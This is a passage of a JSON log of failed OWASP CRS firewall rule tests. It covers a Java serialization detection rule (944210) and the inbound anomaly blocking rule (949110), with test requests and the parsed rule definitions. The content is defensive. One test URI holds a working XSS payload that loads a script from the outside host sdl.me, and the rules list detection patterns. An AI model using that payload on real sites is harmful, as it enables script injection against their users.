          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 7,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML attribute name includes keyword rO0ABQ",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "XML attribute name includes keyword rO0ABQ",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element rO0ABQ=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 23,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML element includes keyword KztAAU",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "XML element includes keyword KztAAU",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><KztAAU attribute_name=\"attribute_value\">value</KztAAU></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 24,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML attribute name includes keyword KztAAU",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "XML attribute name includes keyword KztAAU",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element KztAAU=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 40,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML element includes keyword Cs7QAF",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 40,
      "desc" : "XML element includes keyword Cs7QAF",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><Cs7QAF attribute_name=\"attribute_value\">value</Cs7QAF></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 41,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML attribute name includes keyword Cs7QAF",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 41,
      "desc" : "XML attribute name includes keyword Cs7QAF",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element Cs7QAF=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "949110",
    "test_id" : 1,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
    "cause" : "failed expect_id check: 949110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 949110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 949110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " always check threshold in phase 2"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "BLOCKING_INBOUND_ANOMALY_SCORE"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "ge",
        "value" : "%{tx.inbound_anomaly_score_threshold}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 949110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "deny"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "anomaly-evaluation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        } ]
      }
    }
  }, {
    "test_rule" : "949110",
    "test_id" : 4,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 920100-10 (protocol enforcement positive test in phase 1) but here we assert that inbound blocking mechanism is triggered",
    "cause" : "failed expect_id check: 949110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=911100 - Method is not allowed by policy", "phase=1 rule_id=920100 - Invalid HTTP Request Line" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Test is basically identical to 920100-10 (protocol enforcement positive test in phase 1) but here we assert that inbound blocking mechanism is triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "REALLYLONGUNREALMETHOD",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 949110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 949110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " always check threshold in phase 2"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "BLOCKING_INBOUND_ANOMALY_SCORE"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "ge",
        "value" : "%{tx.inbound_anomaly_score_threshold}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 949110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "deny"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "anomaly-evaluation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
